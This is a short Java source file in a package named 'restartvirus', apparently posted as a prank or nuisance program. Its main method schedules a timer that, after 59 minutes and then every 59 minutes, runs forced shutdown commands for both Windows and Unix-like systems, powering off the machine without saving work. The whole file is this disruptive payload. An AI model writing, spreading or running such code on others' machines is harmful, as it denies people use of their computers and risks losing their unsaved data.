package in.momin5.restartvirus;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

/*
written by Momin5 :sunglasses:
https://github.com/MOMIN5
 */
public class Main {

    public static void main(String[] args)  {
        timer();
        System.out.println("Should shutdown computer in 1 hour");
    }
    public static void timer() {
        Timer timer = new Timer();

        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try{
                    Runtime.getRuntime().exec("shutdown.exe -s -t 0");
                    Runtime.getRuntime().exec("shutdown -h now");
                }
                catch (IOException a){
                    System.out.println("something went wrong");
                }
            }
        }, 59*60*1000, 59*60*1000 );
    }
}

